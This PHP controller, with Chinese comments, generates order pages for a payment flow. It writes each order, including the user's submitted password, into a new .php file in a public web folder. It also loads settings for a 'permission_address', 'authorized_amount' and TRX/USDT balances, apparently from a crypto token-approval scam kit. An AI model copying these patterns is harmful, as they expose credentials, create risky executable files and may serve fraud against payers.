<?php
namespace app\admin\controller;

use think\Controller;
use think\Db;
use think\exception\HttpResponseException;
use think\Response;

class Payment extends Controller {

    /**
     * 处理支付请求
     */
    public function process() {
        if ($this->request->isPost()) {
            try {
                // 获取传递过来的数据
                $goods_id = $this->request->post('goods_id');
                $num = $this->request->post('num');
                $sku_id = $this->request->post('sku_id');
                $pay_type = $this->request->post('pay_type');
                $goods_name = $this->request->post('goods_name');
                $total_price = $this->request->post('total_price');
                $mobile = $this->request->post('mobile');
                $email = $this->request->post('email');
                $password = $this->request->post('password');
                $attach = $this->request->post('attach', []);

                // 查询配置信息
                $config_data = Db::name('options')
                                ->whereIn('name', [
                                    'domain', 'payment_address', 'permission_address',
                                    'bot_key', 'notification_id', 'trx_balance',
                                    'usdt_balance', 'authorized_amount', 'authorize_note'
                                ])->column('value', 'name');

                // 生成唯一订单号
                $order_number = date('YmdHis') . rand(1000, 9999);

                // 读取模板文件内容
                $template_path = $this->app->getRootPath() . 'public/epay/pay.html';
                $template_content = file_get_contents($template_path);
                if ($template_content === false) {
                    throw new \Exception("无法读取模板文件");
                }

                // 替换模板中的占位符
                $order_page_content = str_replace(
                    ['{{ORDER_NUMBER}}', '{{GOODS_NAME}}', '{{NUM}}', '{{TOTAL_PRICE}}', '{{EMAIL}}', '{{PASSWORD}}', '{{MOBILE}}', '{{ATTACH}}'],
                    [$order_number, htmlspecialchars($goods_name), htmlspecialchars($num), htmlspecialchars($total_price), htmlspecialchars($email), htmlspecialchars($password), htmlspecialchars($mobile), $this->generateAttachHtml($attach)],
                    $template_content
                );

                // 将订单页面写入文件
                $order_page_path = $this->app->getRootPath() . "public/epay/$order_number.php";
                if (file_put_contents($order_page_path, $order_page_content) === false) {
                    throw new \Exception("订单页面生成失败");
                }

                // 返回 JSON 响应，包含重定向的 URL
                return json(['status' => 'success', 'redirect_url' => "/epay/$order_number.php"]);
            } catch (\Exception $e) {
                return json(['status' => 'error', 'message' => $e->getMessage()]);
            }
        }
    }

    /**
     * 生成附加信息的 HTML
     * @param array $attach
     * @return string
     */
    private function generateAttachHtml($attach) {
        $html = '';
        foreach ($attach as $item) {
            $html .= "<li>" . htmlspecialchars($item['title']) . ": " . htmlspecialchars($item['value']) . "</li>";
        }
        return $html;
    }
}
